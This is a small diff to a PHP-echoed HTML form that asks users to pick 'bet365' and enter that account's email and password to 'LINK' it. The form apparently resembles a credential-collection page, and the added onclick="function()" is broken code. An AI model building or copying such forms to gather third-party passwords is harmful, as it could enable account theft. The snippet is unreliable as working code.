@@ -16,7 +16,7 @@ echo <<< END_OF_TEXT
 <label for="selector" style="color:#ffe552"><input type="radio" name="rads" value="bet365" >bet365</label><br>
 <input type="text" name="Email" placeholder="EMAIL" style="border-radius: 10px;"  >
 <input type="text" name="password" placeholder="PASSWORD" style="border-radius: 10px;"  >
-<input type="submit" value="LINK">
+<input type="submit" value="LINK" onclick="function()">
 
 </form>
 <h2 id="result"></h2>
@@ -24,6 +24,7 @@ echo <<< END_OF_TEXT
 document.mainForm.onclick = function(){
   var radVal = document.mainForm.rads.value;
   result.innerHTML = 'You selected: '+radVal;
+
 }
 </script>
 END_OF_TEXT;
